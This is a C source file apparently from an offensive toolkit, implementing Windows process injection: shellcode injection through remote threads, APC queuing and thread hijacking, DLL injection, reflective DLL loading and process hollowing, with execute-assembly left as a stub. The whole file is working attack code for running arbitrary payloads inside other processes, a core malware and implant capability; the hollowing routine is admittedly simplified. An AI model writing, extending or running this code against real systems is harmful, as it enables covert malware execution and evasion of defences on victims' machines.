/**
 * @file inject.c
 * @brief Process injection implementation
 */

#include "inject.h"

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#else
/* Linux/macOS injection requires different approach */
#include <sys/ptrace.h>
#include <sys/wait.h>
#endif

int inject_shellcode(
    uint32_t target_pid,
    const uint8_t *shellcode,
    size_t shellcode_size,
    inject_technique_t technique
) {
#ifdef _WIN32
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID remote_buffer = NULL;
    int result = -1;
    
    /* Open target process */
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        target_pid
    );
    
    if (!hProcess) {
        return -1;
    }
    
    /* Allocate memory in target process */
    remote_buffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remote_buffer) {
        CloseHandle(hProcess);
        return -1;
    }
    
    /* Write shellcode to target process */
    SIZE_T bytes_written;
    if (!WriteProcessMemory(hProcess, remote_buffer, shellcode, shellcode_size, &bytes_written)) {
        VirtualFreeEx(hProcess, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    
    /* Execute shellcode based on technique */
    switch (technique) {
        case INJECT_REMOTE_THREAD:
            /* CreateRemoteThread */
            hThread = CreateRemoteThread(
                hProcess,
                NULL,
                0,
                (LPTHREAD_START_ROUTINE)remote_buffer,
                NULL,
                0,
                NULL
            );
            result = (hThread != NULL) ? 0 : -1;
            if (hThread) CloseHandle(hThread);
            break;
            
        case INJECT_QUEUE_APC:
            /* QueueUserAPC to all threads */
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                THREADENTRY32 te32;
                te32.dwSize = sizeof(THREADENTRY32);
                
                if (Thread32First(hSnapshot, &te32)) {
                    do {
                        if (te32.th32OwnerProcessID == target_pid) {
                            HANDLE hTargetThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                            if (hTargetThread) {
                                QueueUserAPC((PAPCFUNC)remote_buffer, hTargetThread, 0);
                                CloseHandle(hTargetThread);
                            }
                        }
                    } while (Thread32Next(hSnapshot, &te32));
                }
                CloseHandle(hSnapshot);
                result = 0;
            }
            break;
            
        case INJECT_THREAD_HIJACK:
            /* Thread hijacking */
            hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                THREADENTRY32 te32;
                te32.dwSize = sizeof(THREADENTRY32);
                
                if (Thread32First(hSnapshot, &te32)) {
                    if (te32.th32OwnerProcessID == target_pid) {
                        HANDLE hTargetThread = OpenThread(
                            THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                            FALSE,
                            te32.th32ThreadID
                        );
                        
                        if (hTargetThread) {
                            SuspendThread(hTargetThread);
                            
                            CONTEXT ctx;
                            ctx.ContextFlags = CONTEXT_FULL;
                            GetThreadContext(hTargetThread, &ctx);
                            
                            /* Set instruction pointer to shellcode */
#ifdef _WIN64
                            ctx.Rip = (DWORD64)remote_buffer;
#else
                            ctx.Eip = (DWORD)remote_buffer;
#endif
                            SetThreadContext(hTargetThread, &ctx);
                            ResumeThread(hTargetThread);
                            
                            CloseHandle(hTargetThread);
                            result = 0;
                        }
                    }
                }
                CloseHandle(hSnapshot);
            }
            break;
            
        default:
            result = -1;
    }
    
    CloseHandle(hProcess);
    return result;
#else
    /* Linux injection via ptrace */
    return -1; /* Not implemented */
#endif
}

int inject_dll(uint32_t target_pid, const char *dll_path) {
#ifdef _WIN32
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID remote_buffer = NULL;
    
    /* Open target process */
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        target_pid
    );
    
    if (!hProcess) {
        return -1;
    }
    
    /* Allocate memory for DLL path */
    size_t path_len = strlen(dll_path) + 1;
    remote_buffer = VirtualAllocEx(hProcess, NULL, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!remote_buffer) {
        CloseHandle(hProcess);
        return -1;
    }
    
    /* Write DLL path to target process */
    SIZE_T bytes_written;
    if (!WriteProcessMemory(hProcess, remote_buffer, dll_path, path_len, &bytes_written)) {
        VirtualFreeEx(hProcess, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    
    /* Get LoadLibraryA address */
    LPVOID load_library_addr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    
    if (!load_library_addr) {
        VirtualFreeEx(hProcess, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    
    /* Create remote thread to call LoadLibraryA */
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)load_library_addr,
        remote_buffer,
        0,
        NULL
    );
    
    if (!hThread) {
        VirtualFreeEx(hProcess, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    
    /* Wait for thread to finish */
    WaitForSingleObject(hThread, INFINITE);
    
    /* Cleanup */
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remote_buffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return 0;
#else
    return -1; /* Not implemented for Linux */
#endif
}

void *inject_reflective_dll(const uint8_t *dll_data, size_t dll_size) {
#ifdef _WIN32
    /* Parse PE headers */
    IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *)dll_data;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    
    IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *)(dll_data + dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    
    /* Allocate memory for DLL */
    SIZE_T image_size = nt_headers->OptionalHeader.SizeOfImage;
    LPVOID base_address = VirtualAlloc(
        NULL,
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!base_address) {
        return NULL;
    }
    
    /* Copy headers */
    memcpy(base_address, dll_data, nt_headers->OptionalHeader.SizeOfHeaders);
    
    /* Copy sections */
    IMAGE_SECTION_HEADER *section = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section++) {
        LPVOID section_dest = (LPVOID)((DWORD_PTR)base_address + section->VirtualAddress);
        const uint8_t *section_src = dll_data + section->PointerToRawData;
        memcpy(section_dest, section_src, section->SizeOfRawData);
    }
    
    /* Process relocations */
    IMAGE_DATA_DIRECTORY *reloc_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (reloc_dir->Size > 0) {
        DWORD_PTR delta = (DWORD_PTR)base_address - nt_headers->OptionalHeader.ImageBase;
        IMAGE_BASE_RELOCATION *reloc = (IMAGE_BASE_RELOCATION *)((DWORD_PTR)base_address + reloc_dir->VirtualAddress);
        
        while (reloc->VirtualAddress > 0) {
            DWORD num_entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD *reloc_entry = (WORD *)((DWORD_PTR)reloc + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD i = 0; i < num_entries; i++) {
                if ((reloc_entry[i] >> 12) == IMAGE_REL_BASED_HIGHLOW ||
                    (reloc_entry[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    DWORD_PTR *patch_addr = (DWORD_PTR *)((DWORD_PTR)base_address + reloc->VirtualAddress + (reloc_entry[i] & 0xFFF));
                    *patch_addr += delta;
                }
            }
            
            reloc = (IMAGE_BASE_RELOCATION *)((DWORD_PTR)reloc + reloc->SizeOfBlock);
        }
    }
    
    /* Resolve imports */
    IMAGE_DATA_DIRECTORY *import_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR *import_desc = (IMAGE_IMPORT_DESCRIPTOR *)((DWORD_PTR)base_address + import_dir->VirtualAddress);
        
        while (import_desc->Name != 0) {
            char *module_name = (char *)((DWORD_PTR)base_address + import_desc->Name);
            HMODULE module = LoadLibraryA(module_name);
            
            if (module) {
                DWORD_PTR *thunk = (DWORD_PTR *)((DWORD_PTR)base_address + import_desc->FirstThunk);
                DWORD_PTR *orig_thunk = (DWORD_PTR *)((DWORD_PTR)base_address + import_desc->OriginalFirstThunk);
                
                while (*thunk) {
                    if (IMAGE_SNAP_BY_ORDINAL(*orig_thunk)) {
                        *thunk = (DWORD_PTR)GetProcAddress(module, (LPCSTR)IMAGE_ORDINAL(*orig_thunk));
                    } else {
                        IMAGE_IMPORT_BY_NAME *import_name = (IMAGE_IMPORT_BY_NAME *)((DWORD_PTR)base_address + *orig_thunk);
                        *thunk = (DWORD_PTR)GetProcAddress(module, import_name->Name);
                    }
                    thunk++;
                    orig_thunk++;
                }
            }
            
            import_desc++;
        }
    }
    
    /* Call DllMain */
    DWORD entry_point = nt_headers->OptionalHeader.AddressOfEntryPoint;
    if (entry_point > 0) {
        typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
        DllMain_t dll_main = (DllMain_t)((DWORD_PTR)base_address + entry_point);
        dll_main((HINSTANCE)base_address, DLL_PROCESS_ATTACH, NULL);
    }
    
    return base_address;
#else
    return NULL; /* Not implemented for Linux */
#endif
}

uint32_t inject_process_hollow(const char *target_exe, const uint8_t *payload, size_t payload_size) {
#ifdef _WIN32
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    /* Create suspended process */
    if (!CreateProcessA(
        target_exe,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return 0;
    }
    
    /* Unmap original image */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection) {
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        
        PVOID image_base;
#ifdef _WIN64
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 16), &image_base, sizeof(PVOID), NULL);
#else
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &image_base, sizeof(PVOID), NULL);
#endif
        NtUnmapViewOfSection(pi.hProcess, image_base);
    }
    
    /* Write payload (simplified - needs full PE parsing) */
    IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *)payload;
    IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *)(payload + dos_header->e_lfanew);
    
    LPVOID new_base = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)nt_headers->OptionalHeader.ImageBase,
        nt_headers->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (new_base) {
        WriteProcessMemory(pi.hProcess, new_base, payload, payload_size, NULL);
        
        /* Update entry point */
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
        ctx.Rcx = (DWORD64)new_base + nt_headers->OptionalHeader.AddressOfEntryPoint;
#else
        ctx.Eax = (DWORD)new_base + nt_headers->OptionalHeader.AddressOfEntryPoint;
#endif
        SetThreadContext(pi.hThread, &ctx);
        
        /* Resume */
        ResumeThread(pi.hThread);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        return pi.dwProcessId;
    }
    
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 0;
#else
    return 0; /* Not implemented for Linux */
#endif
}

int inject_execute_assembly(const uint8_t *assembly_data, size_t assembly_size, const char *args) {
#ifdef _WIN32
    /* Requires CLR hosting - complex implementation */
    /* Simplified stub */
    return -1;
#else
    return -1;
#endif
}
